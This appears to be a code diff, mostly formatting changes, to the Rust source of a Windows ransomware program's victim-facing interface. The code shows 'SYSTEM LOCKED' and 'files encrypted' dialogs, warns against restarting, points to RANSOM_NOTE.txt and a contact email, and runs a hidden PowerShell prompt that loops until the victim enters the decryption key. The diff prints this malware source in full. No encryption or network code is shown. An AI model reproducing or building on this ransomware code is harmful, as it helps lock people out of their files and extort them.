@@ -3,9 +3,9 @@
 
 #[cfg(target_os = "windows")]
 pub fn show_ransom_dialog(correct_key: &str) -> Result<(), String> {
-    use winapi::um::winuser::{MessageBoxW, MB_OK, MB_ICONWARNING, MB_SYSTEMMODAL, MB_TOPMOST};
     use std::ptr;
-    
+    use winapi::um::winuser::{MessageBoxW, MB_ICONWARNING, MB_OK, MB_SYSTEMMODAL, MB_TOPMOST};
+
     // Mostrar primer mensaje de advertencia
     let title = wide_string("🔒 SYSTEM LOCKED");
     let message_text = format!(
@@ -19,16 +19,16 @@ pub fn show_ransom_dialog(correct_key: &str) -> Result<(), String> {
          Press OK to enter the decryption key."
     );
     let message = wide_string(&message_text);
-    
+
     unsafe {
         MessageBoxW(
             ptr::null_mut(),
             message.as_ptr(),
             title.as_ptr(),
-            MB_OK | MB_ICONWARNING | MB_SYSTEMMODAL | MB_TOPMOST
+            MB_OK | MB_ICONWARNING | MB_SYSTEMMODAL | MB_TOPMOST,
         );
     }
-    
+
     // Loop persistente pidiendo la key usando PowerShell InputBox
     loop {
         let ps_script = r#"Add-Type -AssemblyName Microsoft.VisualBasic;
@@ -44,50 +44,50 @@ Contact: EMAIL
 ⚠️  WARNING: Do not restart or your data will be lost permanently!',
 'DECRYPTION KEY REQUIRED',
 '')"#;
-        
+
         let output = std::process::Command::new("powershell")
             .args(&["-WindowStyle", "Hidden", "-Command", ps_script])
             .output();
-        
+
         match output {
             Ok(result) => {
                 let user_key = String::from_utf8_lossy(&result.stdout).trim().to_string();
-                
+
                 if user_key.is_empty() {
                     // Usuario canceló o no ingresó nada
                     let error_title = wide_string("❌ ERROR");
                     let error_msg = wide_string(
                         "You must enter the decryption key to recover your files!\n\n\
                          Without the key, your files cannot be recovered.\n\n\
-                         Try again or check RANSOM_NOTE.txt for instructions."
+                         Try again or check RANSOM_NOTE.txt for instructions.",
                     );
-                    
+
                     unsafe {
                         MessageBoxW(
                             ptr::null_mut(),
                             error_msg.as_ptr(),
                             error_title.as_ptr(),
-                            MB_OK | MB_ICONWARNING | MB_TOPMOST
+                            MB_OK | MB_ICONWARNING | MB_TOPMOST,
                         );
                     }
                     continue;
                 }
-                
+
                 if user_key == correct_key {
                     // Key correcta!
                     let success_title = wide_string("✅ SUCCESS");
                     let success_msg = wide_string(
                         "Key accepted! Your files are being decrypted...\n\n\
                          Please wait while your files are restored.\n\
-                         This may take a few moments."
+                         This may take a few moments.",
                     );
-                    
+
                     unsafe {
                         MessageBoxW(
                             ptr::null_mut(),
                             success_msg.as_ptr(),
                             success_title.as_ptr(),
-                            MB_OK | MB_TOPMOST
+                            MB_OK | MB_TOPMOST,
                         );
                     }
                     return Ok(());
@@ -98,15 +98,15 @@ Contact: EMAIL
                         "The key you entered is incorrect!\n\n\
                          Please check RANSOM_NOTE.txt and try again.\n\n\
                          Contact: EMAIL\n\n\
-                         The correct key is in the note file."
+                         The correct key is in the note file.",
                     );
-                    
+
                     unsafe {
                         MessageBoxW(
                             ptr::null_mut(),
                             error_msg.as_ptr(),
                             error_title.as_ptr(),
-                            MB_OK | MB_ICONWARNING | MB_TOPMOST
+                            MB_OK | MB_ICONWARNING | MB_TOPMOST,
                         );
                     }
                 }
@@ -116,15 +116,15 @@ Contact: EMAIL
                 let error_title = wide_string("❌ ERROR");
                 let error_msg = wide_string(
                     "Failed to show input dialog. Retrying...\n\n\
-                     Make sure PowerShell is available on your system."
+                     Make sure PowerShell is available on your system.",
                 );
-                
+
                 unsafe {
                     MessageBoxW(
                         ptr::null_mut(),
                         error_msg.as_ptr(),
                         error_title.as_ptr(),
-                        MB_OK | MB_ICONWARNING | MB_TOPMOST
+                        MB_OK | MB_ICONWARNING | MB_TOPMOST,
                     );
                 }
                 continue;
@@ -136,9 +136,9 @@ Contact: EMAIL
 /// Shows a simple warning dialog after encryption completes (non-blocking)
 #[cfg(target_os = "windows")]
 pub fn show_encryption_complete_dialog(key_hint: &str) -> Result<(), String> {
-    use winapi::um::winuser::{MessageBoxW, MB_OK, MB_ICONWARNING, MB_TOPMOST};
     use std::ptr;
-    
+    use winapi::um::winuser::{MessageBoxW, MB_ICONWARNING, MB_OK, MB_TOPMOST};
+
     let title = wide_string("🔒 ENCRYPTION COMPLETE");
     let message_text = format!(
         "⚠️  YOUR FILES HAVE BEEN ENCRYPTED  ⚠️\n\n\
@@ -153,24 +153,24 @@ pub fn show_encryption_complete_dialog(key_hint: &str) -> Result<(), String> {
         &key_hint[..16.min(key_hint.len())]
     );
     let message = wide_string(&message_text);
-    
+
     unsafe {
         MessageBoxW(
             ptr::null_mut(),
             message.as_ptr(),
             title.as_ptr(),
-            MB_OK | MB_ICONWARNING | MB_TOPMOST
+            MB_OK | MB_ICONWARNING | MB_TOPMOST,
         );
     }
-    
+
     Ok(())
 }
 
 #[cfg(target_os = "windows")]
 pub fn show_encryption_progress_dialog(files_count: usize) -> Result<(), String> {
-    use winapi::um::winuser::{MessageBoxW, MB_OK, MB_ICONINFORMATION, MB_TOPMOST};
     use std::ptr;
-    
+    use winapi::um::winuser::{MessageBoxW, MB_ICONINFORMATION, MB_OK, MB_TOPMOST};
+
     let title = wide_string("🔄 Encryption in Progress");
     let message_text = format!(
         "Please wait...\n\n\
@@ -180,16 +180,16 @@ pub fn show_encryption_progress_dialog(files_count: usize) -> Result<(), String>
         files_count
     );
     let message = wide_string(&message_text);
-    
+
     unsafe {
         MessageBoxW(
             ptr::null_mut(),
             message.as_ptr(),
             title.as_ptr(),
-            MB_OK | MB_ICONINFORMATION | MB_TOPMOST
+            MB_OK | MB_ICONINFORMATION | MB_TOPMOST,
         );
     }
-    
+
     Ok(())
 }
 
